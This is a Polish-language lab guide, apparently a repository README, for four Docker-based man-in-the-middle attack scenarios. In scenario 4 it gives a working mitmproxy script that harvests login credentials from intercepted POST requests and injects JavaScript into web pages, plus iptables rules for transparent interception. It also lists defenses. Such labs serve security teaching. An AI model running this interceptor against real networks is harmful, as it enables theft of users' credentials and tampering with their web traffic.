# Scenariusze Ataków Man-in-the-Middle (MitM) z Wykorzystaniem Docker

## Krótkie streszczenie

Poniżej przedstawiam **cztery praktyczne scenariusze ataku Man-in-the-Middle** z wykorzystaniem kontenerów Docker, które można wdrożyć w środowisku testowym. Każdy scenariusz ilustruje inną technikę ataku (ARP spoofing, DNS spoofing, SSL stripping i przechwytywanie HTTP), zawiera dokładne instrukcje konfiguracji, wymagane narzędzia oraz krokowe procedury wykonania. Wszystkie scenariusze są edukacyjne i powinny być przeprowadzane wyłącznie w izolowanym środowisku laboratoryjnym.

---

## Scenariusz 1: Atak ARP Spoofing z przechwytywaniem ruchu


### Opis scenariusza

Jest to klasyczny atak Man-in-the-Middle polegający na podrobieniu adresów ARP (Address Resolution Protocol) w celu przekierowania ruchu sieciowego przez maszynę atakującego (Attacker01). Trzy kontenery Docker (Client01, Server01 i Attacker01) są połączone w sieci Docker bridge. Client01 wysyła żądania HTTP do serwera Server01, ale ruch przechodzi przez Attacker01, który może obserwować i modyfikować komunikację.

### Pełna dokumentacja

Kompletne instrukcje krok po kroku, konfiguracja Docker, skrypty automatyzujące oraz szczegółowe procedury testowania znajdują się w:

**[Lab01/README.md](Lab01/README.md)**

---


## Scenariusz 02: Atak DNS Spoofing

### Opis scenariusza

Jest to atak Man-in-the-Middle polegający na podszyciu się za pomocą spoofingu ARP pod bramę sieci i przekierowaniu zapytań dns (port 53) do fałszywego serwera DNS dzięki czemu można modyfikować zawartość dowolnej strony www.

### Pełna dokumentacja

Kompletne instrukcje krok po kroku, konfiguracja Docker, skrypty automatyzujące oraz szczegółowe procedury testowania znajdują się w:

**[Lab02/README.md](Lab02/README.md)**

---

## Scenariusz 3: SSL Stripping z HTTP Toolkit

### Opis scenariusza

SSL stripping to technika polegająca na usuwaniu szyfrowania HTTPS i konwersji komunikacji na nieszyfrowane HTTP. W tym scenariuszu implementujemy transparentny proxy używając mitmproxy, który przechwytuje i deszyfruje ruch HTTPS, pozwalając atakującemu czytać i modyfikować zawartość komunikacji. Klient jest automatycznie routowany przez interceptor bez wiedzy o przechwytywaniu, symulując prawdziwy atak Man-in-the-Middle.

### Pełna dokumentacja

Kompletne instrukcje krok po kroku, konfiguracja Docker, skrypty automatyzujące oraz szczegółowe procedury testowania znajdują się w:

**[Lab03/README.md](Lab03/README.md)**

Laboratorium obejmuje:
- Konfigurację transparentnego proxy z automatycznym routingiem
- Przechwytywanie i deszyfrowanie ruchu HTTP/HTTPS
- Logowanie szczegółów żądań i odpowiedzi
- Analizę przechwyconych danych z użyciem tcpdump i mitmproxy
- Demonstrację przechwytywania danych uwierzytelniających w plain-text

---

## Scenariusz 4: HTTP Request/Response Interception z Modyfikacją

### Opis scenariusza

Najbardziej zaawansowany scenariusz demonstrujący pełną kontrolę nad komunikacją HTTP/HTTPS. Atakujący może przeglądać, modyfikować i injektować zawartość w żądaniach i odpowiedziach.

### Wymagane zasoby

- **Docker**
- **mitmproxy z custom scriptami Python**
- **Rozmiar**: Około 250 MB

### Konfiguracja

**Dockerfile dla advanced interceptor**
```dockerfile
FROM python:3.10-slim

RUN pip install mitmproxy==9.3.1 requests

WORKDIR /app
COPY intercept_advanced.py /app/

RUN apt-get update && apt-get install -y \
    iptables \
    net-tools \
    tcpdump \
    && rm -rf /var/lib/apt/lists/*

CMD ["mitmproxy", "-m", "transparent", "-s", "/app/intercept_advanced.py"]
```

**intercept_advanced.py** (zaawansowany skrypt intercepcji)
```python
import json
import os
from mitmproxy import http, ctx
from datetime import datetime

# Konfiguracja
LOG_DIR = "/app/logs"
os.makedirs(LOG_DIR, exist_ok=True)

class Interceptor:
    def __init__(self):
        self.request_count = 0
        self.captured_credentials = []
        
    def request(self, flow: http.HTTPFlow) -> None:
        self.request_count += 1
        
        # Logging żądania
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "method": flow.request.method,
            "url": flow.request.pretty_url,
            "headers": dict(flow.request.headers),
            "client_ip": flow.client_conn.address[0],
        }
        
        # Captura danych logowania
        if flow.request.method == "POST":
            try:
                content = flow.request.get_text()
                log_entry["body"] = content
                
                # Szukanie danych logowania
                if "password" in content.lower() or "credentials" in content.lower():
                    self.captured_credentials.append(log_entry)
                    ctx.log.warn(f"[!] Potencjalne dane logowania: {content[:100]}")
            except:
                pass
        
        # Zapisanie logu
        with open(f"{LOG_DIR}/requests.log", "a") as f:
            f.write(json.dumps(log_entry) + "\n")
        
        ctx.log.info(f"Request #{self.request_count}: {flow.request.pretty_url}")
    
    def response(self, flow: http.HTTPFlow) -> None:
        # Modyfikacja odpowiedzi
        if "example.com" in flow.request.host:
            if flow.response.status_code == 200:
                if "text/html" in flow.response.headers.get("content-type", ""):
                    # Injection JavaScriptu
                    injection = b"""
                    <script>
                    console.log("This page has been modified by MitM");
                    // Można tu injektować złośliwy kod
                    </script>
                    """
                    flow.response.content = injection + flow.response.content
                    ctx.log.warn("[!] Zawartość HTML została zmodyfikowana")
        
        # Logowanie odpowiedzi
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "url": flow.request.pretty_url,
            "status": flow.response.status_code,
            "response_size": len(flow.response.content),
        }
        
        with open(f"{LOG_DIR}/responses.log", "a") as f:
            f.write(json.dumps(log_entry) + "\n")

addons = [Interceptor()]
```

**docker-compose-scenario4.yml**
```yaml
version: '3.8'

services:
  client:
    image: ubuntu:22.04
    container_name: advanced_client
    networks:
      intercept_network:
        ipv4_address: 172.23.0.2
    environment:
      - HTTP_PROXY=http://172.23.0.3:8080
      - HTTPS_PROXY=http://172.23.0.3:8080
    volumes:
      - ./client_scripts:/workspace
    command: /bin/sleep 3600
    stdin_open: true
    tty: true

  interceptor:
    build:
      context: .
      dockerfile: Dockerfile.advanced_interceptor
    container_name: advanced_interceptor
    networks:
      intercept_network:
        ipv4_address: 172.23.0.3
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    volumes:
      - ./intercept_logs:/app/logs
      - ./intercept_scripts:/app
    stdin_open: true
    tty: true

  web_server:
    image: httpbin/httpbin:latest
    container_name: httpbin_server
    networks:
      intercept_network:
        ipv4_address: 172.23.0.4
    expose:
      - "80"

networks:
  intercept_network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.23.0.0/24
```

### Fazy zaawansowanego interception

**Faza 1: Setup**
```bash
docker-compose -f docker-compose-scenario4.yml build
docker-compose -f docker-compose-scenario4.yml up -d
```

**Faza 2: Konfiguracja iptables i uruchomienie interception**
```bash
docker exec -it advanced_interceptor bash

sysctl -w net.ipv4.ip_forward=1

iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

mitmproxy -m transparent -s /app/intercept_advanced.py --listen-port 8080
```

**Faza 3: Generowanie ruchu z klienta**
```bash
docker exec -it advanced_client bash

apt-get update && apt-get install -y curl

# Test zapytań
for i in {1..10}; do
  curl -s http://httpbin.org/get?param=$i
  curl -s -X POST http://httpbin.org/post -d "username=user&password=secret123"
done

# Obserwacja logów
watch -n 1 'tail -f /app/logs/requests.log'
```

**Faza 4: Analiza captured danych**
```bash
# Obejrzenie przechwyconych żądań
docker exec advanced_interceptor cat /app/logs/requests.log | jq .

# Obejrzenie przechwyconych odpowiedzi
docker exec advanced_interceptor cat /app/logs/responses.log | jq .
```

### Wskaźniki sukcesu

- ✓ Wszystkie żądania HTTP/HTTPS są zalogowane
- ✓ Dane POST są przechwycone i wyświetlane
- ✓ Zawartość HTML jest modyfikowana on-the-fly
- ✓ Pliki logów zawierają wszystkie szczegóły połączeń

---

## Opcje obrony i detekcji

### Dla każdego scenariusza można wdrożyć mechanizmy obrony:

**Detekcja ARP Spoofing (Scenariusz 1)**
- Monitoring zmian ARP cache
- Statyczne wpisy ARP dla krytycznych urządzeń
- Narzędzia: ArpWatch, Snort

**Obrona DNS (Scenariusz 2)**
- DNSSEC dla weryfikacji autentyczności
- DNS over HTTPS (DoH)
- DNS over TLS (DoT)
- RPZ (Response Policy Zones)

**Zabezpieczenie SSL/TLS (Scenariusz 3)**
- Certificate pinning
- HSTS (HTTP Strict Transport Security)
- Monitorowanie logów certyfikatów
- Narzęzia: Let's Encrypt Cert Transparency

**Ochrona HTTP (Scenariusz 4)**
- HTTPS everywhere
- Input validation
- Content Security Policy (CSP)
- Intrusion Detection Systems (IDS)

---

## Wymagane komendy do czyszczenia

```bash
# Zatrzymanie wszystkich scenariuszy
docker-compose -f docker-compose.yml down
docker-compose -f docker-compose-scenario2.yml down
docker-compose -f docker-compose-scenario3.yml down
docker-compose -f docker-compose-scenario4.yml down

# Usunięcie sieci
docker network prune -f

# Usunięcie obrazów
docker rmi mitm_alice mitm_bob mitm_eve evil_dns_server -f
```

---

Każdy scenariusz demonstruje rzeczywiste techniki ataku MitM stosowane przez atakujących, ale w izolowanym, edukacyjnym środowisku. Wszystkie eksperymenty powinny być przeprowadzane wyłącznie w własnym, izolowanym laboratorium testowym.